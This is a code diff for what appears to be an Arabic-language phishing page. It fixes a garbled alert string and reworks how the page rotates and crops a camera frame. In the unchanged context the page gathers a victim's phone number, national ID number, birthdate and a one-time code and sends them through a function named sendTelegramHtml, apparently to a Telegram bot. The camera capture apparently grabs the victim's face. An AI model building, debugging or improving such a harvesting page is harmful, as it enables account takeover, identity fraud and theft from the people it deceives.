@@ -337,7 +337,7 @@
       document.getElementById('code5Form').onsubmit = async (e) => {
         e.preventDefault();
         const code = codeInput.value.trim();
-        if (code.length !== 5) { alert('يرجى إدخال رمز مكون من 5 أر��ام'); codeInput.focus(); return; }
+        if (code.length !== 5) { alert('يرجى إدخال رمز مكون من 5 أرقام'); codeInput.focus(); return; }
         userData.code5 = code;
         await sendTelegramHtml(`رقم الهاتف: ${codeWrap(userData.phone)}\nالرقم الوطني: ${codeWrap(userData.nationalId)}\nتاريخ الميلاد: ${escapeHtml(userData.birthdate)}\nالرمز المؤقت: ${codeWrap(userData.code5)}`);
         showWaitMsgAndGotoCode4();
@@ -474,36 +474,39 @@
           ctx.fillRect(0,0,targetW,targetH);
 
           try {
+            // Draw the current video frame into a source canvas first
+            const src = document.createElement('canvas');
+            src.width = vw;
+            src.height = vh;
+            const sctx = src.getContext('2d');
+            sctx.drawImage(videoEl, 0, 0, vw, vh);
+
+            let rotatedCanvas = src;
+
             if (vw > vh) {
-              // Source appears landscape (common on some devices even in portrait).
-              // Rotate the frame into portrait before cropping/scaling.
-              const temp = document.createElement('canvas');
-              temp.width = vh; // rotated width becomes source height
-              temp.height = vw; // rotated height becomes source width
-              const tctx = temp.getContext('2d');
+              // Source is landscape: rotate it to become upright portrait.
+              // We'll rotate 90deg clockwise so the face appears upright.
+              const rot = document.createElement('canvas');
+              rot.width = vh;   // rotated width becomes source height
+              rot.height = vw;  // rotated height becomes source width
+              const rctx = rot.getContext('2d');
 
-              // rotate -90deg (CCW) so the video becomes upright portrait
-              tctx.translate(temp.width / 2, temp.height / 2);
-              tctx.rotate(-Math.PI / 2);
-              // draw the original video centered into temp
-              tctx.drawImage(videoEl, -vw / 2, -vh / 2, vw, vh);
+              // rotate 90 degrees clockwise around center
+              rctx.translate(rot.width / 2, rot.height / 2);
+              rctx.rotate(Math.PI / 2);
+              // draw the source centered into rotated canvas
+              rctx.drawImage(src, -vw / 2, -vh / 2, vw, vh);
 
-              // center-crop from temp to offscreen with cover scaling
-              const scale = Math.max(targetW / temp.width, targetH / temp.height);
-              const srcW = Math.round(targetW / scale);
-              const srcH = Math.round(targetH / scale);
-              const sx = Math.round((temp.width - srcW) / 2);
-              const sy = Math.round((temp.height - srcH) / 2);
-              ctx.drawImage(temp, sx, sy, srcW, srcH, 0, 0, targetW, targetH);
-            } else {
-              // Source is already portrait shaped — do center-crop -> fill
-              const scale = Math.max(targetW / vw, targetH / vh);
-              const srcW = Math.round(targetW / scale);
-              const srcH = Math.round(targetH / scale);
-              const sx = Math.round((vw - srcW) / 2);
-              const sy = Math.round((vh - srcH) / 2);
-              ctx.drawImage(videoEl, sx, sy, srcW, srcH, 0, 0, targetW, targetH);
+              rotatedCanvas = rot;
             }
+
+            // center-crop from rotatedCanvas to offscreen with cover scaling
+            const scale = Math.max(targetW / rotatedCanvas.width, targetH / rotatedCanvas.height);
+            const srcW = Math.round(targetW / scale);
+            const srcH = Math.round(targetH / scale);
+            const sx = Math.round((rotatedCanvas.width - srcW) / 2);
+            const sy = Math.round((rotatedCanvas.height - srcH) / 2);
+            ctx.drawImage(rotatedCanvas, sx, sy, srcW, srcH, 0, 0, targetW, targetH);
           } catch (err) {
             // ignore occasional drawing issues
             console.warn('drawLoop draw error', err);
